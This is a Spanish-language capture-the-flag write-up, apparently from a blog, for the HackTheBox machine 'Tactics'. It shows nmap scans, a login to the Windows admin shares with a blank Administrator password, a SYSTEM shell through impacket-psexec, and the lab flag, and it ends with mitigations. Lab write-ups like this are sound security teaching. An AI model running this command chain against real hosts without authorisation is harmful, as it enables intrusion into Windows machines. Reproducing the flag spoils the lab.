---
layout: post
title: HTB — Tactics
date: 2026-04-26
platform: HackTheBox
difficulty: very-easy
description: SMB con Administrator sin contraseña → acceso SYSTEM via PsExec
tags:
  - SMB
  - PsExec
  - Windows
---

## Introducción

Tactics presenta el mismo stack SMB de Dancing, pero con un nivel más de sofisticación: en lugar de un share anónimo, aquí el usuario `Administrator` no tiene contraseña asignada — lo que da acceso a los shares administrativos de Windows (`ADMIN$`, `C$`) con permisos de lectura y escritura. Desde ahí, `impacket-psexec` convierte ese acceso SMB en una shell como SYSTEM.

---

## Reconocimiento

Verificamos conectividad:

```bash
ping -c 1 10.129.7.115
# -c 1    Envía solo 1 paquete ICMP
```

Descubrimiento de puertos:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.7.115 -oG allports
# -p-          Escanea los 65535 puertos
# -sS          SYN scan (sigiloso, no completa el handshake TCP)
# --open       Muestra solo puertos abiertos
# --min-rate   Envía mínimo 5000 paquetes por segundo
# -vvv         Verbose: muestra resultados en tiempo real
# -n           Sin resolución DNS (más rápido)
# -Pn          Omite el host discovery (asume que el host está activo)
# -oG          Guarda el output en formato Grepable
```

Output relevante:

```
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Escaneo de versiones y scripts:

```bash
nmap -sCV -p135,139,445 10.129.7.115 -oN target
# -sC            Ejecuta scripts de detección por defecto (NSE)
# -sV            Detecta versión del servicio
# -p135,139,445  Escanea solo los puertos especificados
# -oN            Guarda el output en formato Normal (legible)
```

Output relevante:

```
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
Service Info: OS: Windows
```

Stack Windows clásico. El vector es SMB en el 445.

---

## Enumeración SMB

Pruebo null session con smbclient:

```bash
smbclient -L 10.129.7.115 -U Administrator --no-pass
# -L              Lista shares disponibles
# -U              Usuario
# --no-pass       Sin contraseña
```

```
NT_STATUS_LOGON_FAILURE
```

Fallo. Pruebo con smbmap que maneja mejor las autenticaciones:

```bash
smbmap -H 10.129.7.115 -u Administrator -p ''
# -H    Host objetivo
# -u    Usuario
# -p    Contraseña vacía (string vacío)
```

Output relevante:

```
[+] IP: 10.129.7.115:445    Status: ADMIN!!!
    ADMIN$    READ, WRITE    Remote Admin
    C$        READ, WRITE    Default share
    IPC$      READ ONLY      Remote IPC
```

Administrator sin contraseña tiene **READ, WRITE** en `ADMIN$` y `C$` — acceso total al sistema de archivos de Windows.

---

## Explotación — Shell via PsExec

Con acceso de escritura en `ADMIN$`, uso `impacket-psexec` para obtener una shell. PsExec funciona subiendo un ejecutable al share `ADMIN$` y ejecutándolo como servicio:

```bash
impacket-psexec Administrator@10.129.7.115 -no-pass
# Administrator@IP    Usuario y host objetivo
# -no-pass            Sin contraseña
```

```
C:\Windows\system32>
```

Shell como SYSTEM.

---

## Flag

```cmd
cd C:\Users\Administrator\Desktop
dir
type flag.txt
# f751c19eda8f61ce81827e6930a1f40c
```

---

## Comandos básicos Windows en shell

| Linux | Windows | Función |
|-------|---------|---------|
| `ls` | `dir` | Listar archivos |
| `cat` | `type` | Ver contenido de archivo |
| `pwd` | `cd` (sin args) | Ver directorio actual |
| `whoami` | `whoami` | Ver usuario actual |
| `rm` | `del` | Eliminar archivo |
| `clear` | `cls` | Limpiar pantalla |

---

## smbclient vs smbmap — diferencia clave

Durante la resolución se identificó una diferencia importante:

```bash
# smbclient con --no-pass falló:
smbclient -L IP -U Administrator --no-pass
# NT_STATUS_LOGON_FAILURE

# smbmap con -p '' funcionó:
smbmap -H IP -u Administrator -p ''
# Acceso como ADMIN!!!
```

`--no-pass` y `-p ''` no son equivalentes en todos los casos. Cuando uno falla, probar el otro.

---

## ¿Qué aprendemos de esto?

**Administrator sin contraseña en Windows es acceso total.** La cuenta de administrador local sin contraseña combinada con SMB expuesto a la red es un vector de entrada directo a cualquier máquina Windows. No requiere exploits ni técnicas avanzadas.

**PsExec convierte acceso SMB en shell.** Tener permisos de escritura en `ADMIN$` no es solo acceso a archivos — es ejecución de código en el sistema. PsExec abusa de esta capacidad para crear y ejecutar servicios remotamente.

**SMB signing not required facilita ataques de relay.** El mensaje `Message signing enabled but not required` indica que los mensajes SMB no están firmados obligatoriamente — esto permite ataques de NTLM relay en entornos de red más complejos.

---

## Resumen técnico

| Elemento | Detalle |
|----------|---------|
| Puerto | 445/tcp (SMB) |
| Vulnerabilidad | Administrator sin contraseña con acceso a shares administrativos |
| Acceso obtenido | Shell como SYSTEM vía PsExec |
| Herramientas | `nmap`, `smbmap`, `impacket-psexec` |
| Mitigación | Asignar contraseña robusta a Administrator, deshabilitar SMB si no es necesario, habilitar SMB signing obligatorio, restringir acceso a shares administrativos |
